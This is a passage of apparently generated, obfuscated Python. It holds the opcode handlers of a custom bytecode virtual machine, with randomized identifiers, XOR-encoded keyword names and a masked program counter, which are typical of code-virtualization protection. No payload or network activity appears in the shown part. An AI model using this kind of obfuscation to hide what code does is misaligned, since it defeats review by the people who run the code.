   elif _v in frame._vljexq77aw.freevars:
    _cl.append(frame._ia1wj0tp[len(frame._vljexq77aw.cellvars) + frame._vljexq77aw.freevars.index(_v)])
 _defs = registers[_d] if _fl & 1 else ()
 _kwdefs = (registers[_d + 1] if _fl & 1 else registers[_d]) if _fl & 2 else {}
 registers[_d] = _uuy41ibljh(_co, globals_dict, defaults=_defs or (), kw_defaults=_kwdefs or {}, closure=tuple(_cl))
def _xx536(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].add(val)
def _xp46d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].append(val)
def _xcf11(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ia1wj0tp[arg].val = stack.pop()
def _dr5ca(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xy395(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop()
 if val:
  frame._z5a0l725 = arg
def _xvb65(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left | right)
def _xkff4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = iter(registers[arg[1]])
def _xx1dd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _c, _r1, _r2 = arg
 if _c == 0:
  raise
 elif _c == 1:
  raise registers[_r1]
 elif _c == 2:
  raise registers[_r1] from registers[_r2]
def _xva56(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _yht7pze9 = stack.pop(); _tzlaoi4e = stack.pop()
 stack.append(_tzlaoi4e[_yht7pze9])
def _xue58(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _loonncil = stack.pop(); _dx2ek3zezq = stack.pop()
 stack.append(_dx2ek3zezq ^ _loonncil)
def _xu38f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 setattr(registers[arg[0]], names[arg[1]], registers[arg[2]])
def _xpe0e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_0 = stack.pop(); locals_dict[names[3]] = _b_0_0; _n = names[4]
 _b_1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
 stack.append(_b_1_0)
def _xe30d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame._el6246hi:
  _b = frame._el6246hi.pop()
  if _b.type == _kdd4v30t.WITH:
   frame._d25owf759 = _b.exit_fn
def _xi444(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _l8t2sa5b = stack.pop(); _mja2m0w10 = stack.pop()
 stack.append(_mja2m0w10 | _l8t2sa5b)
def _xecc8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _idx = arg; registers[_dst] = consts[_idx]
def _xo712(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _x60361i2 = stack.pop(); _hgj11yedwb = stack.pop()
 stack.append(_hgj11yedwb + _x60361i2)
def _xh775(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] | registers[arg[2]]
def _xsa38(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _l2atqyyv = stack.pop(); _udia5u6hc = stack.pop()
 stack.append(_udia5u6hc - _l2atqyyv)
def _xnc25(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _noxko8g8qy = stack.pop(); _lpdpoc50 = stack.pop()
 stack.append(_lpdpoc50 ** _noxko8g8qy)
def _xw7c3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _name = names[arg[1]]
 if _name in locals_dict:
  registers[arg[0]] = locals_dict[_name]
 elif _name in globals_dict:
  registers[arg[0]] = globals_dict[_name]
 elif builtins_dict and _name in builtins_dict:
  registers[arg[0]] = builtins_dict[_name]
 else:
  raise NameError(f"name '{_name}' is not defined")
def _xo4ff(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] * registers[arg[2]]
def _xd4f7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left ** right)
def _xk156(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 delattr(registers[arg[0]], names[arg[1]])
def _xdfc1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 while len(fastlocals) <= arg:
  fastlocals.append(None)
 fastlocals[arg] = stack[-1]
def _xd372(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[30]; registers[10] = _b_0_c; _b_1_c = consts[21]
 registers[11] = _b_1_c; _b_2_c = consts[21]; registers[12] = _b_2_c
def _xf91f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 name_idx, argc = arg; name = names[name_idx]
 if name == 'super' and argc == 0:
  if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
   stack.append(_builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0]))
  else:
   stack.append(_builtins.super())
 else:
  func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
  args = stack[-argc:] if argc > 0 else []
  if argc > 0:
   del stack[-argc:]
  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
   args = [func.__self__] + list(args); func = func.__func__
  if isinstance(func, _uuy41ibljh):
   _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
   frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
  else:
   stack.append(func(*args))
def _xxa5a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] * fastlocals[arg[1]])
def _xq839(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg; registers[_d] = set((registers[_b + i] for i in range(_c)))
def _xdbd3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = -registers[arg[1]]
def _xo994(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _fn, _argc = arg; _k = registers[_fn + 1 + _argc]; _kc = len(_k)
 _pc = _argc - _kc; _pargs = [registers[_fn + 1 + i] for i in range(_pc)]
 _kvals = [registers[_fn + 1 + _pc + i] for i in range(_kc)]
 _dk = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in _k))
 _kw = dict(zip(_dk, _kvals)); registers[_dst] = registers[_fn](*_pargs, **_kw)
def _xj762(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].extend(val)
def _xbcf7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ia1wj0tp[arg[0]].val = registers[arg[1]]
def _xx566(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 d = {}
 if arg > 0:
  pairs = stack[-2 * arg:]; del stack[-2 * arg:]
  for i in range(0, len(pairs), 2):
   d[pairs[i]] = pairs[i + 1]
 stack.append(d)
def _xs9dc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = fastlocals[arg[1]]
def _xr42e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop()
 if not val:
  frame._z5a0l725 = arg
def _xi31e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _qm43d8w3zp = names[arg]
 if _qm43d8w3zp in locals_dict:
  del locals_dict[_qm43d8w3zp]
 else:
  raise NameError(f"name '{_qm43d8w3zp}' is not defined")
def _xba44(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
def _xi841(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _val = registers[arg]; stack.append(_val)
def _xt7c5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
def _xn387(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg] = stack.pop()
def _xrd40(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ixo9t7e8g = registers[arg]; return _RET_SIGNAL
def _xk572(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 globals_dict[names[arg[0]]] = registers[arg[1]]
def _xw8c9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _name = names[arg[1]]
 if _name in globals_dict:
  registers[arg[0]] = globals_dict[_name]
 elif builtins_dict and _name in builtins_dict:
  registers[arg[0]] = builtins_dict[_name]
 else:
  raise NameError(f"name '{_name}' is not defined")
def _xd5b2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count
 kw_values = stack[-kw_count:] if kw_count > 0 else []
 if kw_count > 0:
  del stack[-kw_count:]
 pos_args = stack[-pos_count:] if pos_count > 0 else []
 if pos_count > 0:
  del stack[-pos_count:]
 func = stack.pop()
 dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
 kwargs = dict(zip(dec_keys, kw_values))
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  pos_args = [func.__self__] + list(pos_args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*pos_args, **kwargs))
def _xbde1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] // registers[arg[2]]
def _xccb5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(getattr(stack[-1], names[arg]))
def _xad24(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] - consts[arg[1]])
def _xz5eb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_1_c = consts[16]; registers[0] = _b_1_c; _b_2_c = consts[17]
 registers[1] = _b_2_c; _b_3_c = consts[17]; registers[2] = _b_3_c
def _xdb8b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-1] = +stack[-1]
def _xp90b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(frame._ia1wj0tp[arg].val)
def _xgbb9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _xr1yxr2dh = names[arg]; _wlurtp0l = globals_dict
 if _xr1yxr2dh in _wlurtp0l:
  _wjjeget1g = _wlurtp0l[_xr1yxr2dh]; stack.append(_wjjeget1g)
 elif _xr1yxr2dh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _xr1yxr2dh in builtins_dict:
  stack.append(builtins_dict[_xr1yxr2dh])
 else:
  raise NameError(f"name '{_xr1yxr2dh}' is not defined")
def _xk76b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
def _xibb4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] / registers[arg[2]]
def _xcabf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _au6n7hv3i = stack.pop(); locals_dict[names[arg]] = _au6n7hv3i
def _xr82d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 pass
def _xebbf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 mod = stack.pop()
 if hasattr(mod, '__all__'):
  for k in mod.__all__:
   locals_dict[k] = getattr(mod, k)
 else:
  for k, v in mod.__dict__.items():
   if not k.startswith('_'):
    locals_dict[k] = v
def _xm53e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[2]; registers[0] = _b_0_c; _b_1_c = consts[1]
 registers[1] = _b_1_c
def _xz891(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left + right)
def _xyd6a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left & right)
def _xma88(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] & registers[arg[2]]
def _xo60f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[18]; registers[1] = _b_0_c; _b_1_c = consts[17]
 registers[2] = _b_1_c; _b_2_c = consts[19]; registers[3] = _b_2_c
def _xa27e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 2:
  upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
 elif arg == 3:
  step = stack.pop(); upper = stack.pop(); lower = stack.pop()
  stack.append(slice(lower, upper, step))
def _xgc45(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _gr09skdgig = stack.pop(); globals_dict[names[arg]] = _gr09skdgig
def _xs763(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(tuple(stack.pop()))
def _xrd15(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if stack[-1]:
  frame._z5a0l725 = arg
 else:
  stack.pop()
def _xzbe3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left == right)
def _xgfdc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left < right)
def _xh3a9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[34]; registers[14] = _b_0_c; _b_1_c = consts[23]
 registers[15] = _b_1_c; _b_2_c = consts[21]; registers[16] = _b_2_c
def _xlf18(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ixo9t7e8g = consts[arg]; return _RET_SIGNAL
def _xe471(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._z5a0l725 = arg
def _xic3a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[20]; registers[2] = _b_0_c; _b_1_c = consts[17]
 registers[3] = _b_1_c; _b_2_c = consts[21]; registers[4] = _b_2_c
def _xye94(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg
 registers[_d] = slice(registers[_b], registers[_b + 1]) if _c == 2 else slice(registers[_b], registers[_b + 1], registers[_b + 2])
def _xhf0c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left > right)
def _xoa6d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _gpmnz1udb = stack.pop(); _fbcppvohsm = stack.pop()
 stack.append(_fbcppvohsm % _gpmnz1udb)
def _xc7b5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _mod = registers[arg]
 if hasattr(_mod, '__all__'):
  for _k in _mod.__all__:
   locals_dict[_k] = getattr(_mod, _k)
 else:
  for _k, _v in _mod.__dict__.items():
   if not _k.startswith('_'):
    locals_dict[_k] = _v
def _xzd8f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left @ right)
def _xp4e3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-2] = stack[-2] - stack[-1]; stack.pop()
def _xg40b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[40]; registers[19] = _b_0_c; _b_1_c = consts[37]
 registers[20] = _b_1_c; _b_2_c = consts[23]; registers[21] = _b_2_c
def _dv2a8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xxf03(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg; registers[_d] = [registers[_b + i] for i in range(_c)]
def _xe7c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _s, _db, _cnt = arg; _seq = list(registers[_s])
 for i in range(_cnt):
  registers[_db + _cnt - 1 - i] = _seq[i]
def _xk4d1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left is not right)
def _xe409(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[28]; registers[8] = _b_0_c; _b_1_c = consts[21]
 registers[9] = _b_1_c; _b_2_c = consts[17]; registers[10] = _b_2_c
def _xe6fb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left % right)
def _xn486(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); cmp_arg = arg
 if arg == 0:
  stack.append(not left >= right)
 elif arg == 1:
  stack.append(not left > right)
 elif arg == 2:
  stack.append(not left != right)
 elif arg == 3:
  stack.append(not left == right)
 elif arg == 4:
  stack.append(not left <= right)
 elif arg == 5:
  stack.append(not left < right)
 elif arg == 6:
  stack.append(left in right)
 elif arg == 7:
  stack.append(not left in right)
 elif arg == 8:
  stack.append(left is right)
 elif arg == 9:
  stack.append(not left is right)
 elif arg == 10:
  stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xh206(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _y5len606 = stack.pop(); _m9rr7s20c = stack.pop()
 stack.append(_m9rr7s20c @ _y5len606)
def _xr3a4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
 import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
 stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
def _xp274(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left >= right)
def _xd714(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(registers[arg])
def _xba58(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = tuple([func.__self__] + list(args)); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, kwargs, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args, **kwargs))
def _xb17a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _aqvkizzqy = names[arg]; _iv2heifjfc = stack.pop()
 stack.append(getattr(_iv2heifjfc, _aqvkizzqy))
def _xa2ca(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ixo9t7e8g = stack.pop(); return _RET_SIGNAL
def _xl6af(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _xr1yxr2dh = names[arg]
 if _xr1yxr2dh in globals_dict:
  stack.append(globals_dict[_xr1yxr2dh])
 elif _xr1yxr2dh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _xr1yxr2dh in builtins_dict:
  stack.append(builtins_dict[_xr1yxr2dh])
 else:
  raise NameError(f"name '{_xr1yxr2dh}' is not defined")
def _xm28c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
def _xs95d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[29]; registers[9] = _b_0_c; _b_1_c = consts[21]
 registers[10] = _b_1_c; _b_2_c = consts[19]; registers[11] = _b_2_c
def _xvb74(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left not in right)
def _xce9f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[32]; registers[12] = _b_0_c; _b_1_c = consts[23]
 registers[13] = _b_1_c; _b_2_c = consts[17]; registers[14] = _b_2_c
def _xrd03(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _y8xrg2gzr = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []
 _r8s4c3baew = stack.pop()
 if isinstance(_r8s4c3baew, _types.MethodType) and isinstance(_r8s4c3baew.__func__, _uuy41ibljh):
  _y8xrg2gzr = [_r8s4c3baew.__self__] + list(_y8xrg2gzr)
  _r8s4c3baew = _r8s4c3baew.__func__
 if isinstance(_r8s4c3baew, _uuy41ibljh):
  _cfhqcw76xa = _azytjxepq8(_r8s4c3baew.code, _y8xrg2gzr, {}, _r8s4c3baew.defaults, _r8s4c3baew.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(_r8s4c3baew.code, _r8s4c3baew.globals_dict, fastlocals=_cfhqcw76xa, closure=_r8s4c3baew.closure, func=_r8s4c3baew)
 else:
  stack.append(_r8s4c3baew(*_y8xrg2gzr))
def _xs299(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = ~registers[arg[1]]
def _xoed2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _enf313fpoy = stack.pop(); _hv12ii826 = stack.pop()
 stack.append(_hv12ii826 & _enf313fpoy)
def _xu5c6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _k1n759in4o = stack.pop(); _kr6n92xf8e = stack.pop()
 del _kr6n92xf8e[_k1n759in4o]
def _xl802(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 0:
  stack.append(set())
 else:
  items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xsa83(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[36]; registers[16] = _b_0_c; _b_1_c = consts[37]
 registers[17] = _b_1_c; _b_2_c = consts[17]; registers[18] = _b_2_c
def _xv89a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _zuvulemx = stack.pop(); _y5z8vmuhx = stack.pop()
 stack.append(_y5z8vmuhx // _zuvulemx)
def _xzec8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d3rzsj49it = stack.pop(); _m7s55j2o = stack.pop(); _zja04ux5qr = stack.pop()
 _m7s55j2o[_d3rzsj49it] = _zja04ux5qr
def _xxf46(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = fastlocals[5]; registers[2] = _b_0_v; _b_1_v = fastlocals[6]
 registers[3] = _b_1_v; _b_2_c = consts[44]; registers[4] = _b_2_c
 _b_3_c = consts[44]; registers[5] = _b_3_c; _b_4_c = consts[45]
 registers[6] = _b_4_c; _b_5_c = consts[46]; registers[7] = _b_5_c
def _xm108(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 0:
  stack.append(())
 else:
  items = tuple(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xd27b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _p0b8ic8b = consts[arg]; stack.append(_p0b8ic8b)
def _xr534(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 def _vfkjfpnqv(func, name, *bases, **kwds):
  meta = kwds.get('metaclass')
  if meta is None:
   meta = type(bases[0]) if bases else type
  ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
  if hasattr(func, 'execute_with_locals'):
   func.execute_with_locals(ns)
  else:
   func()
  cls = meta(name, bases, ns, **kwds)
  for item in ns.values():
   if hasattr(item, '__code__'):
    item.__class_owner__ = cls
  return cls
 stack.append(_vfkjfpnqv)
def _xh1ed(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = fastlocals[2]; registers[2] = _b_0_v; _b_1_v = fastlocals[4]
 registers[3] = _b_1_v; _b_2_c = consts[3]; registers[4] = _b_2_c
 _b_3_c = consts[41]; registers[5] = _b_3_c
def _xk222(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _r3bnvbc2vy = arg; frame._z5a0l725 = _r3bnvbc2vy
def _xw9b8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); cmp_arg = arg
 if arg == 0:
  stack.append(left < right)
 elif arg == 1:
  stack.append(left <= right)
 elif arg == 2:
  stack.append(left == right)
 elif arg == 3:
  stack.append(left != right)
 elif arg == 4:
  stack.append(left > right)
 elif arg == 5:
  stack.append(left >= right)
 elif arg == 6:
  stack.append(left in right)
 elif arg == 7:
  stack.append(left not in right)
 elif arg == 8:
  stack.append(left is right)
 elif arg == 9:
  stack.append(left is not right)
 elif arg == 10:
  stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xsf05(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d0_0 = stack.pop(); locals_dict[names[arg[0]]] = _d0_0; _d1_c = consts[arg[1]]
 registers[0] = _d1_c
def _xl482(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]
 res = False
 if cmp_arg == 0:
  res = left < right
 elif cmp_arg == 1:
  res = left <= right
 elif cmp_arg == 2:
  res = left == right
 elif cmp_arg == 3:
  res = left != right
 elif cmp_arg == 4:
  res = left > right
 elif cmp_arg == 5:
  res = left >= right
 elif cmp_arg == 6:
  res = left in right
 elif cmp_arg == 7:
  res = left not in right
 elif cmp_arg == 8:
  res = left is right
 elif cmp_arg == 9:
  res = left is not right
 elif cmp_arg == 10:
  res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 stack.append(res)
def _xifce(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-2] = stack[-2] + stack[-1]; stack.pop()
def _xc126(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
